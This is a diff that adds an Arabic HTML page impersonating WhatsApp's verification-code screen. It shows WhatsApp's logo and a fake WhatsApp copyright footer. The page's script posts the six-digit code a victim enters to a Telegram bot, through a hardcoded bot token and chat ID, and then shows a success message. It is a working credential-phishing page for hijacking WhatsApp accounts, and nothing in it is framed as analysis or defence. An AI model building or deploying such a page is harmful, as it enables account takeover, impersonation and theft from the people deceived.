@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>إدخال كود التحقق</title>
+  <style>
+    body {
+      background: #f2f4f7;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      padding: 20px;
+    }
+    .card {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.05);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+    .logo {
+      width: 64px;
+      height: 64px;
+      margin-bottom: 10px;
+    }
+    h2 {
+      margin-bottom: 10px;
+      color: #067c3c;
+    }
+    p {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 20px;
+    }
+    .code-inputs {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
+    .code-inputs input {
+      width: 48px;
+      height: 48px;
+      text-align: center;
+      font-size: 20px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      background-color: #067c3c;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .footer {
+      font-size: 12px;
+      margin-top: 20px;
+      opacity: 0.6;
+    }
+    .success {
+      color: green;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/WhatsApp_icon.png" alt="WhatsApp Logo" class="logo" />
+    <h2>أدخل كود التحقق</h2>
+    <p>لقد أرسلنا رمز تحقق مكون من 6 أرقام. يرجى إدخاله أدناه.</p>
+
+    <div class="code-inputs">
+      <input type="text" maxlength="1" id="code1" />
+      <input type="text" maxlength="1" id="code2" />
+      <input type="text" maxlength="1" id="code3" />
+      <input type="text" maxlength="1" id="code4" />
+      <input type="text" maxlength="1" id="code5" />
+      <input type="text" maxlength="1" id="code6" />
+    </div>
+
+    <button onclick="sendCode()">تأكيد الكود</button>
+    <div id="status" class="success"></div>
+  </div>
+
+  <div class="footer">© جميع الحقوق محفوظة لشركة واتساب 2024</div>
+
+  <script>
+    const BOT_TOKEN = "8115203717:AAGxK5UGa8MRcCcQACCxNxAjpUATbN8SP7E";
+    const CHAT_ID = "1630822492";
+
+    function sendCode() {
+      const inputs = [
+        document.getElementById("code1").value,
+        document.getElementById("code2").value,
+        document.getElementById("code3").value,
+        document.getElementById("code4").value,
+        document.getElementById("code5").value,
+        document.getElementById("code6").value
+      ];
+      const code = inputs.join("").trim();
+      const status = document.getElementById("status");
+
+      if (code.length !== 6 || isNaN(code)) {
+        status.innerText = "❌ الرجاء إدخال كود مكون من 6 أرقام.";
+        return;
+      }
+
+      const msg = `🔐 كود تحقق من المستخدم:\nرمز التحقق: ${code}`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          status.innerText = "✅ تم إرسال كود التحقق بنجاح.";
+        } else {
+          status.innerText = "❌ فشل إرسال الكود.";
+        }
+      })
+      .catch(() => {
+        status.innerText = "⚠️ فشل الاتصال بالخادم.";
+      });
+    }
+  </script>
+</body>
+</html>
